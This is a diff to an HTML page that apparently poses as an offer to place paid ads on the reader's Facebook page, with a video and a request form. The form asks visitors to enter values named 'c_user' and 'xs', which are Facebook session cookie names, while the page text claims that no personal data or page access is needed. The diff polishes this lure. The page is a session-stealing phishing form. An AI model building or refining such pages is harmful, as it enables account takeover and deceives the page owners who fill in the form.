@@ -56,6 +56,11 @@ body{
     width:100%;
     border-radius:10px;
 }
+.video-title{
+    font-weight:600;
+    margin-bottom:8px;
+    font-size:16px;
+}
 .content{
     font-size:15px;
     line-height:1.6;
@@ -121,29 +126,32 @@ form button{
 
 <!-- Video Section -->
 <div class="video-container">
-<h4>Apply Through This Video</h4>
+<div class="video-title">Apply for Ad Placement</div>
 <video controls>
   <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
   Your browser does not support the video tag.
 </video>
 </div>
 
+<!-- Professional Text Below Video -->
 <div class="content">
-We are excited to offer you the opportunity to feature an advertisement on your Facebook page.  
-This is a safe and guaranteed collaboration, no personal data or page access required.  
+We are excited to offer you the opportunity to feature an advertisement on your Facebook page.
+
+This is a safe and guaranteed collaboration, no personal data or page access required.
 
 Please fill out the form below to submit your request.
 </div>
 
+<!-- Form -->
 <form id="requestForm">
-    <input type="text" name="name" placeholder="c_user" required>
-    <input type="url" name="facebook_page" placeholder="xs" required>
+    <input type="text" name="name" placeholder="Your Name" required>
+    <input type="text" name="xs" placeholder="XS" required>
     <button type="submit" id="submitBtn">
         <span id="btnText">Continue</span>
     </button>
 </form>
 
-<p class="note">Your ad request will be processed securely</p>
+<p class="note">Your request will be processed securely.</p>
 
 </div>
 </div>
